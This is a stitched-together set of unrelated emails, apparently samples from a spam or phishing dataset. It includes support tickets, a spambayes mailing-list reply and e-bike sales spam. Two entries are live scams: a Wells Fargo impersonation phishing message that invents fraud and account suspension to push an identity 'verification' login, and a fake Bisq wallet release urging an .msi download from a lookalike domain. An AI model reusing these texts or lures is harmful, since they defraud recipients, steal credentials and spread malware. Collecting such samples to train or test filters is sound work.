Reported Issue with Digital Campaign Analytics
body:
Dear Customer Support,

I am reporting an issue with our digital campaign analytics that has suddenly stopped working. It could be due to outdated Laravel 8 integration issues, but I am uncertain of the exact cause.

Already checked the Redis 6.2 caching settings, but the problem still exists. I would greatly appreciate your assistance in resolving this as soon as possible.

**What happened:** The digital campaign analytics stopped working suddenly.
**Why it might have occurred:** Potential outdated Laravel 8 integration issues.
**What was tried so far:** Checked Redis 6.2 caching settings.

I am ready to provide any additional information required to resolve this issue. Please let me know if there are any steps I should take or further details you need from me.

Thank you for your timely assistance in this matter. I look forward to your response.

Best regards,
[Your Name]

body: WF Security Dear customer , We have noticed in the last few days , many suspicious activities done in and from your account . Those activities had been made by a fraudulent IP address which is in our black list , it was an american IP , though its owner has settings in his/her PC indicate that he/she is out of the US and using a Proxy as well. This person tried to perform the following : 1- Transferring a high sum of money to another Wellsfargo user , with the account # : 2013331604, First name : Jason , Last name : Korinek. ( Denied ) 2- Changing password and other important information. ( Denied ) If you DID those processes yourself , or they have been DONE accidentally , please send an email to : 'wellsfraud.com' , explaining why and how you did that , to get your account activated ,and to permit us performing your processes. Else, if that was not you , and you want get your account activated , kindly read and follow the next to be in safe : Read this : We recently have created a new agent , prepared for such activities and for contingencies , that is unknown specially to the unauthorized person who logged into your account without your permission .And for your safety , your account now is suspended , that is , you can receive transfers and can NOT make transfers , you get a confirmation message when doing that , however , your transfers will NOT reach the recipient . Paying bills online will be limited as well , while appearing on the non-suspended status. Follow this : Verify your identity by logging into your account in the following site (and you will be redirected to our agent) : , and filling the fields at the next page . Then , change your password in the same page to prevent him logging in future. ---------------------------------------------------------- Q : How my account was accessed without my permission ? A : Many reasons are available : 1st , some internet sites offer illegal contents to attract visitors . And without their permission , they place trojans ( a small high-risk program to open ports in your PC ) and they can spy on you by that small program to know your passwords . 2nd , you may accept files from an unknown person that have the same mission . 3rd , you may have accessed your online account via a public PC . ---------------------------------------------------------- Thank you,Wells Fargo - Online Banking. subject: Urgent Issue with Mercury Language - Parsing Error in Production
body:
We are experiencing a critical issue in our production environment with the Mercury language. We are encountering a parsing error that is causing our application to crash. This is severely impacting our operations, and we need immediate assistance to resolve this issue.

Here are the details of the error:

* **Error message:** Unexpected token '}' at line 123, column 45
* **Mercury version:** 1.2.3
* **Environment:** Production

We have tried restarting our servers and redeploying the application, but the issue persists. We have also checked our code for any syntax errors, but we couldn't find anything.

Please advise on how to troubleshoot and resolve this issue as soon as possible. We are available for a call if needed.

subject: Your Bisq Experience, easy in a Unified Desktop Release
body:
Hello User,

We are pleased to announce the latest Bisq Desktop Application, designed to bring the entire Bisq Network ecosystem into a single, seamless interface.

With this release, you can:

* Navigate the full Bisq experience, from trading to managing your wallet.
* Execute Lightning transactions and perform tasks previously handled on older versions.
* Benefit from improved **security and local data control** on your own device.

The Bisq Desktop App is compatible with Windows, macOS, and Linux, ensuring a smooth experience across major systems.

- Download & Install:
Visit: https://www.bisq-network.store/

1. Select your operating system. {.msi}
2. Download the installer and complete the installation.
3. Launch the app and start interacting with the full Bisq ecosystem.

This is the latest official release from the Bisq team, offering a more reliable, self-contained experience for our users.

Thank you for continuing to build a decentralized future with us.

—
Bisq Network Team

subject: Re: [spambayes-dev] Help: bsddb._db.DBAccessError: (13, 'Permission denied -- put: attempt to modify a read-only tree') in<bound method HammieFilter.close ...
body: > This bug appears to be back in some form: > http://sourceforge.net/tracker/index.php?func=detail&aid=13876 > 99&group_id=61702&atid=498103 Its hard to know if that fix was applied, as there is no attachement with the patch. Hopefully Tony will notice this thread and pipe up. > I was unable to reopen the tracker item. Can someone help me to at > least debug this problem? When exceptions are swallowed like that > without a backtrace, I don't know where to start. I'm guessing the vanishing backtrace is due to it being called by __del__. It *looks* like it might be __del__ in sb_filter.py. However, it looks a little like your exception is slightly different than the backtrace in that bug - the bug refers to an error adding tokens to the DB after training, while your exception sounds more like an exception as the DB is closed. I wish I could be more help... Mark _______________________________________________ spambayes-dev mailing list bsfegmjrr-hnq@python.org http://mail.python.org/mailman/listinfo/spambayes-dev

subject: Wir warten auf Ihre Rückmeldung - We are waiting for your feedback
body: Sehr geehrte Damen und Herren wir sind ein erfahrener Hersteller von E Bikes mit eigenem Lager in Deutschland und bieten derzeit eine attraktive Sonderaktion an Dank unseres deutschen Lagers können wir Bestellungen innerhalb von 3 bis 5 Tagen europaweit ausliefern Aktuell haben wir ein leistungsstarkes faltbares 20 Zoll Fat Tire E Bike im Angebot Motor 500W für starke Leistung und eine maximale Geschwindigkeit von 45 kmh Akku 48V 15Ah Lithium Batterie hohe Reichweite und herausnehmbar Design Kompakt und faltbar ideal für Stadt und Outdoor Abenteuer Falls Sie Interesse haben lassen Sie uns einfach Ihre Lieferadresse zukommen und wir erstellen Ihnen ein individuelles Angebot die Preise können je nach Zielort leicht variieren Zusätzlich suchen wir engagierte Händler und Vertriebspartner in Europa die gemeinsam mit uns wachsen möchten Falls Sie Interesse an einer Kooperation haben freuen wir uns auf Ihre Nachricht Für ein konkretes Angebot oder eine Bestellung senden Sie uns bitte die gewünschte Lieferadresse zu damit wir die genauen Versandkosten berechnen können Wir freuen uns auf Ihre Rückmeldung Mit freundlichen Grüßen Johannes Keller Hi, We are a professional manufacturer of E Bikes with our own warehouse in Germany and are pleased to offer high quality electric bicycles with fast and reliable delivery Thanks to our warehouse in Germany we can ship orders across Europe within 3 to 5 days ensuring a smooth and efficient purchasing experience for our customers Currently we have a special promotion on one of our most popular models a 20 inch Fat Tire Foldable E Bike This model is designed for both urban commuting and off road adventures making it an excellent choice for riders looking for versatility and convenience Key features of this E Bike Motor 500W high performance motor allowing a maximum speed of 45 kmh ensuring a powerful and smooth riding experience Battery 48V 15Ah lithium battery providing a long range and easy removability for convenient charging Design Compact and foldable making it easy to store and transport perfect for daily commuters and outdoor enthusiasts Versatility Suitable for a wide range of terrains including city streets mountain trails beaches and even snowy roads Comfort Equipped with front suspension and a sturdy frame for enhanced stability and shock absorption In addition to selling directly to customers we are actively looking for dealers and business partners across Europe If you are interested in distributing our products we offer flexible partnership options and competitive wholesale prices Our goal is to establish long term cooperation with reliable partners and grow together in the expanding E Bike market If you would like more details or have specific requirements reach out to us For an exact price calculation and shipping cost estimation please send us the address and we will get back to you as soon as possible We look forward to your inquiry and the opportunity to work together Best regards Johannes Keller
